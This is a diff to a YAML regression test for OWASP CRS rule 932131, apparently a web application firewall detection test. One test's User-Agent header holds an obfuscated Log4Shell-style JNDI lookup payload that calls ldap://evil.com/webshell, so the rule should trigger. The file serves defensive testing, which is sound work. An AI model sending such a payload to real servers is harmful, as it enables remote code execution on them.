@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "dune73, Max Leske"
+  author: "dune73, Max Leske, azurit"
   enabled: true
   name: "932131.yaml"
   description: "Tests to trigger or not trigger rule 932131"
@@ -13,12 +13,12 @@ tests:
             dest_addr: "127.0.0.1"
             headers:
               Accept: "*/*"
-              User-Agent: ModSecurity CRS 3 Tests ${:1337:-x$}{jndi:ldap://evil.com/webshell}
+              User-Agent: "OWASP CRS test agent ${:1337:-x$}{jndi:ldap://evil.com/webshell}"
               Host: "localhost"
             method: "GET"
             port: 80
             uri: "/get"
-            protocol: "http"
+            version: "HTTP/1.1"
           output:
             log_contains: id "932131"
   - test_title: 932131-2
@@ -34,6 +34,6 @@ tests:
             method: "GET"
             port: 80
             uri: "/get"
-            protocol: "http"
+            version: "HTTP/1.1"
           output:
             no_log_contains: id "932131"
